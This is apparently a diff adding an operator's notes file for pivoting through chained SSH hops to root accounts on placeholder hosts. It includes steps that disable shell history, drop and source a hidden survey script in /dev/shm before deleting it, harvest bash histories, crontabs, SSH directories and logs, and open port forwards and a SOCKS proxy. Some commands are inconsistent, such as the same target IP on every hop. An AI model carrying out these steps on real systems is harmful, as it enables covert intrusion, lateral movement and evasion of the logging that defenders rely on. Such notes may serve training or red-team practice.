@@ -1,0 +1,104 @@
+Targets					OS								Status
+>
+
+#set buffer
+x11vnc -o vnclog&
+vinagre 10.50.25.# 5900
+
+mkdir /cline_101117_op1
+cp survey.sh
+cp opnotes-template
+cd /cline_101117_op1
+script termscreen.$$
+
+===============
+--
+===============
+
+ssh -v -x -M -f -N -o ControlPath=/tmp/hop-1 root@1.1.1.1
+ssh -o ControlPath=/tmp/hop-1 root@1.1.1.1
+
+unset HISTFILE HISTFILESIZE HISTSIZE 
+export LESSHISTFILE=/dev/null
+scp -o ControlPath=/tmp/hop-1 /cline_101117_op1/survey.sh root@1.1.1.1:/dev/shm/.a
+source /dev/shm/.a
+rm -f /dev/shm/.a
+
+Ran the following mando commands in script survey.sh
+date; date -u
+ps -elf
+netstat -natup || ss -natup
+ifconfig || ip a
+w
+uname -a
+df -h
+ls -latr /
+ls -latr /tmp
+ls -latr .
+ls -latr ..
+ls -latr /root
+ls -latr /var/log
+find / -type f -mmin -20 | egrep -v '\/sys|\/proc'
+cat /root/.bash_history
+cat /home/*/.bash_history
+cat /root/.viminfo
+cat /home/*/.viminfo
+
+
+
+Ran the following commands in survey.sh script
+cat /etc/*syslog*
+lsmod
+cat /etc/*release*
+servcie --status-all || systemctl status --no-pager
+for user in $(cat /etc/passwd | egrep '/bin/sh|/bin/bash' | cut -d \: -f1); do crontab -u $user -l; done
+cat /etc/crontab
+cat /proc/cpuinfo
+ls -la /etc/cron.*
+ip nei || arp -vn
+route -n
+mount
+cat /etc/rc.local
+if [[ $(lsmod | grep -i table) ]]; then eval "iptables -L"; else echo "No IPTables"; fi
+echo ""
+ls -latr /root/.ssh
+ls -latr /home/*/.ssh
+
+
+Ran the following exit commands in script survey.sh
+ps -elf
+netstat -lptn
+find / -type f -mmin -120 | egrep -v '\/sys|\/proc' 2>/dev/null
+ls -latr /dev/shm
+ls -latr /tmp
+ls -latr /var/log
+ssh -S /tmp/hop-1 -O exit root@1.1.1.1
+
+===============
+--
+===============
+ssh -o ControlPath=/tmp/hop-1 -O forward root@1.1.1.1 -L 10602:2.2.2.2:22
+
+ssh -v -x -M -f -N -o ControlPath=/tmp/hop-2 -p 10602 root@127.0.0.1
+ssh -o ControlPath=/tmp/hop-2 root@127.0.0.1
+unset HISTFILE HISTFILESIZE HISTSIZE
+scp -o ControlPath=/tmp/hop-2 /root/Downloads/survey.sh root@1.1.1.1:/dev/shm/.a
+source /dev/shm/.a
+rm /dev/shm/.a
+
+ssh -v -x -N -f -o ControlPath=/tmp/hop-2 root@127.0.0.1 -D 9050
+
+ssh -S /tmp/hop-2 -O exit root@127.0.0.1
+
+===============
+--
+===============
+ssh -o ControlPath=/tmp/hop-2 -O forward root@127.0.0.1 -p 10602 -L 10603:3.3.3.3:22
+ssh -v -x -M -f -N -o ControlPath=/tmp/hop-3 -p 10603 root@127.0.0.1
+ssh -o ControlPath=/tmp/hop-3 root@127.0.0.1
+unset HISTFILE HISTFILESIZE HISTSIZE
+scp -o ControlPath=/tmp/hop-3 /root/Downloads/survey.sh root@1.1.1.1:/dev/shm/.a
+source /dev/shm/.a
+rm /dev/shm/.a
+
+ssh -S /tmp/hop-3 -O exit root@127.0.0.1
